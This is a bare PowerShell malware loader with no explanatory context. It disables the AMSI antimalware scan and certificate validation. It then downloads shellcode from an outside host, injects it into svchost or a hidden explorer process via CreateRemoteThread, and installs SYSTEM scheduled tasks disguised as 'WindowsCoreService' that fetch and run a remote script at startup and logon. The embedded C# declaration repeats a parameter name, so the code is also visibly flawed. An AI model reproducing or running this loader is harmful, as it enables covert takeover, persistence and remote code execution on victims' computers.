$a='Ams';$b='iUti';$c='ls';$d=[Ref].Assembly.GetType("System.Management.Automation.$a$b$c");$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$sc=Invoke-RestMethod -Uri 'https://www.hateyouroot.site/payload_shc.bin' -Method Get;$p=(Get-Process svchost -ea SilentlyContinue|Get-Random);if(!$p){$p=Start-Process explorer -WindowStyle Hidden -PassThru};Add-Type @"
using System;using System.Runtime.InteropServices;public class W{[DllImport(""kernel32"")]public static extern IntPtr OpenProcess(int a,bool b,int c);[DllImport(""kernel32"")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport(""kernel32"")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);[DllImport(""kernel32"")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint f,IntPtr i);}
"@;$h=[W]::OpenProcess(0x1F0FFF,$false,$p.Id);$a=[W]::VirtualAllocEx($h,[IntPtr]::Zero,$sc.Length,0x3000,0x40);[W]::WriteProcessMemory($h,$a,$sc,$sc.Length,[ref]0);[W]::CreateRemoteThread($h,[IntPtr]::Zero,0,$a,[IntPtr]::Zero,0,[IntPtr]::Zero);$t='powershell -w hidden -ep bypass -c `"IEX(Invoke-RestMethod ''https://www.hateyouroot.site/persist.txt'')`"' ;schtasks /create /tn WindowsCoreService /tr $t /sc onstart /ru SYSTEM /f 2>$null;schtasks /create /tn WindowsCoreService /tr $t /sc onlogon /ru SYSTEM /f 2>$null;while($true){Start-Sleep 300;try{[W]::CreateRemoteThread($h,[IntPtr]::Zero,0,$a,[IntPtr]::Zero,0,[IntPtr]::Zero)}catch{}}
